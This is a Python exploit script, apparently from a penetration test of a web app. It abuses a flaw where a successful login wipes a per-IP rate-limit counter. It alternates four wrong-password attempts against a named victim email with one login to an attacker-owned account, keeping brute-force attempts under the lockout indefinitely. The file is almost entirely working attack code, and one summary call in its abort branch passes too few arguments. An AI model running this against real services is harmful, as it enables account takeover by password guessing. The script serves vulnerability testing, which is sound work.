#!/usr/bin/env python3
"""
AUTH-VULN-03: Rate limit bypass via successful login reset.

How the vulnerability works (from server/routes.ts):
  - checkRateLimit(ip) is called at the TOP of every login handler (both
    /api/client/login and /api/admin/login).  It increments a counter and
    returns False once count >= 5, blocking the request with HTTP 429.
  - resetRateLimit(ip) calls loginAttempts.delete(ip), which WIPES the
    counter entirely, and is called only after a SUCCESSFUL authentication.
  - Because both endpoints share the SAME in-memory Map keyed by IP, a
    successful login on /api/client/login resets the counter for all
    subsequent attempts — including brute-force attempts against a
    different victim account on the same endpoint.

Attack cycle:
  4 × FAIL (victim) → counter reaches 4
  1 × SUCCESS (attacker own account) → counter wiped to 0
  4 × FAIL (victim) → counter reaches 4
  1 × SUCCESS (attacker own account) → counter wiped to 0
  ... repeat indefinitely

This script:
  1. Clears any residual counter by logging in with the attacker account first.
  2. Runs 3 full bypass cycles (4 fail + 1 reset each) = 12 failed attempts.
  3. Reports each request and a final verdict.
"""

import json
import urllib.request
import urllib.error
from datetime import datetime

BASE_URL = "http://host.docker.internal:3000"

ATTACKER_EMAIL    = "idor.test@attacker.com"
ATTACKER_PASSWORD = "TestPassword123"
ATTACKER_ENDPOINT = "/api/client/login"

VICTIM_EMAIL    = "gustavo@skylineip.com.br"
VICTIM_ENDPOINT = "/api/client/login"

# Pool of wrong passwords — we rotate through them so logs are varied
WRONG_PASSWORDS = [
    "WrongPass001", "WrongPass002", "WrongPass003", "WrongPass004",
    "WrongPass005", "WrongPass006", "WrongPass007", "WrongPass008",
    "WrongPass009", "WrongPass010", "WrongPass011", "WrongPass012",
]


# ── helpers ────────────────────────────────────────────────────────────────────

def login(endpoint: str, email: str, password: str) -> tuple[int, dict | str]:
    url = BASE_URL + endpoint
    payload = json.dumps({"email": email, "senha": password}).encode()
    req = urllib.request.Request(
        url, data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
            try:
                return resp.status, json.loads(raw)
            except json.JSONDecodeError:
                return resp.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", errors="replace")
        try:
            return e.code, json.loads(raw)
        except json.JSONDecodeError:
            return e.code, raw


def snippet(body: dict | str, max_len: int = 110) -> str:
    text = json.dumps(body) if isinstance(body, dict) else str(body)
    return text[:max_len] + ("..." if len(text) > max_len else "")


def ts() -> str:
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]


SEP = "─" * 82


# ── main ───────────────────────────────────────────────────────────────────────

def main():
    print(SEP)
    print("AUTH-VULN-03  Rate Limit Bypass via Successful Login Reset")
    print(f"Started : {datetime.now().isoformat()}")
    print(f"Victim  : {VICTIM_EMAIL}  (brute-force target)")
    print(f"Attacker: {ATTACKER_EMAIL}  (owns valid credentials)")
    print(SEP)

    pw_idx              = 0
    victim_attempts     = 0   # total FAIL_VICTIM attempts across all cycles
    victim_429s         = 0   # 429s received while attacking victim
    attacker_resets_ok  = 0   # successful reset logins
    attacker_resets_429 = 0   # reset attempts that were themselves blocked

    # ── Step 0: pre-clear any leftover counter from previous test runs ─────────
    print("\n[STEP 0]  Pre-clear residual rate-limit counter")
    print("         (log in with attacker account to wipe the in-memory counter)")
    status, body = login(ATTACKER_ENDPOINT, ATTACKER_EMAIL, ATTACKER_PASSWORD)
    tag = "RESET-OK" if status == 200 else f"STATUS={status}"
    print(f"  [{tag}] [{ts()}] {ATTACKER_EMAIL} → {snippet(body)}")
    if status != 200:
        print()
        print("  [WARNING] Pre-clear login did not return 200.")
        print("  This could mean:")
        print("  a) The rate limit from a previous run is still active (wait 15 min), OR")
        print("  b) Attacker credentials are wrong.")
        print("  Continuing anyway so we capture whatever the server returns ...")

    # ── Step 1: verify rate limit is real ─────────────────────────────────────
    print(f"\n[STEP 1]  Confirm rate limit triggers normally (5 rapid failed attempts)")
    baseline_hit_limit = False
    for i in range(1, 7):          # up to 6 to be sure
        pw = WRONG_PASSWORDS[pw_idx % len(WRONG_PASSWORDS)]; pw_idx += 1
        status, body = login(VICTIM_ENDPOINT, VICTIM_EMAIL, pw)
        victim_attempts += 1
        tag = "429-BLOCKED" if status == 429 else "FAIL_VICTIM"
        print(f"  [{tag}] [{ts()}] baseline attempt {i} | pw={pw} | HTTP {status} | {snippet(body)}")
        if status == 429:
            victim_429s += 1
            baseline_hit_limit = True
            print(f"  [+] Rate limit confirmed: blocked on attempt {i}")
            break

    if not baseline_hit_limit:
        print("  [?] Did not hit 429 in 6 attempts — rate limit may not be active")

    # ── Step 2: reset counter once so bypass cycles start from zero ────────────
    print(f"\n[STEP 2]  Reset counter with attacker successful login")
    status, body = login(ATTACKER_ENDPOINT, ATTACKER_EMAIL, ATTACKER_PASSWORD)
    if status == 200:
        attacker_resets_ok += 1
        print(f"  [RESET-OK] [{ts()}] counter wiped | HTTP {status} | {snippet(body)}")
    else:
        attacker_resets_429 += 1
        print(f"  [RESET-FAIL status={status}] [{ts()}] | {snippet(body)}")
        print("  [!] Cannot reset — rate limit still blocking attacker account too.")
        print("  This means the rate limit is IP-wide; attacker must wait.")
        print("  Aborting bypass demonstration.")
        _print_summary(victim_attempts, victim_429s - (1 if baseline_hit_limit else 0),
                       attacker_resets_ok, attacker_resets_429, cycles_done=0)
        return

    # ── Step 3: bypass cycles ─────────────────────────────────────────────────
    CYCLES = 3
    FAILS_PER_CYCLE = 4     # stay under the 5-attempt limit each cycle
    print(f"\n[STEP 3]  Bypass demonstration — {CYCLES} cycles × "
          f"({FAILS_PER_CYCLE} FAIL_VICTIM + 1 RESET)")
    print(SEP)

    cycle_victim_attempts = 0  # victim attempts inside bypass cycles only
    cycle_victim_429s     = 0

    for cycle in range(1, CYCLES + 1):
        print(f"\n  ┌── Cycle {cycle}/{CYCLES} ──────────────────────────────────────────")

        # 4 failed attempts
        for attempt in range(1, FAILS_PER_CYCLE + 1):
            pw = WRONG_PASSWORDS[pw_idx % len(WRONG_PASSWORDS)]; pw_idx += 1
            status, body = login(VICTIM_ENDPOINT, VICTIM_EMAIL, pw)
            victim_attempts       += 1
            cycle_victim_attempts += 1
            tag = "429-BLOCKED" if status == 429 else "FAIL_VICTIM"
            print(f"  │  [{tag}] [{ts()}] attempt {attempt}/{FAILS_PER_CYCLE} "
                  f"pw={pw} HTTP {status} | {snippet(body)}")
            if status == 429:
                victim_429s       += 1
                cycle_victim_429s += 1

        # 1 successful reset
        status, body = login(ATTACKER_ENDPOINT, ATTACKER_EMAIL, ATTACKER_PASSWORD)
        if status == 200:
            attacker_resets_ok += 1
            tag = "RESET-OK"
        else:
            attacker_resets_429 += 1
            tag = f"RESET-FAIL(HTTP {status})"
        print(f"  └  [{tag}] [{ts()}] attacker reset | HTTP {status} | {snippet(body)}")

    # ── Summary ───────────────────────────────────────────────────────────────
    _print_summary(victim_attempts, cycle_victim_attempts, cycle_victim_429s,
                   attacker_resets_ok, attacker_resets_429, cycles_done=CYCLES)


def _print_summary(total_victim, cycle_victim, cycle_victim_429,
                   resets_ok, resets_fail, cycles_done):
    unblocked = cycle_victim - cycle_victim_429
    print(f"\n{SEP}")
    print("RESULTS SUMMARY")
    print(SEP)
    print(f"  Cycles completed                             : {cycles_done}")
    print(f"  Total victim attempts (all phases)           : {total_victim}")
    print(f"  Victim attempts inside bypass cycles         : {cycle_victim}")
    print(f"  429 blocks inside bypass cycles              : {cycle_victim_429}")
    print(f"  Bypass-cycle victim attempts WITHOUT 429     : {unblocked}")
    print(f"  Successful attacker resets (HTTP 200)        : {resets_ok}")
    print(f"  Failed attacker resets (not 200)             : {resets_fail}")
    print()
    expected_unblocked = cycles_done * 4  # 4 attempts per cycle, none should be blocked
    if cycles_done > 0 and cycle_victim_429 == 0 and unblocked == expected_unblocked:
        print("  [VULNERABLE] AUTH-VULN-03 CONFIRMED")
        print(f"  All {unblocked} bypass-cycle victim attempts completed with NO 429 blocks.")
        print("  resetRateLimit() on successful login wipes the IP counter, allowing")
        print("  indefinite brute-force cycling past the 5-attempt rate limit.")
    elif cycles_done > 0 and cycle_victim_429 < cycle_victim:
        print(f"  [PARTIAL] {unblocked}/{cycle_victim} bypass-cycle attempts avoided 429.")
        print("  Vulnerability is partially present but some attempts were still blocked.")
    else:
        print("  [BLOCKED] All bypass-cycle attempts were rate-limited. Vulnerability")
        print("  may be mitigated OR the rate limit counter was not successfully reset.")
    print(SEP)
    print(f"Finished: {datetime.now().isoformat()}")


if __name__ == "__main__":
    main()
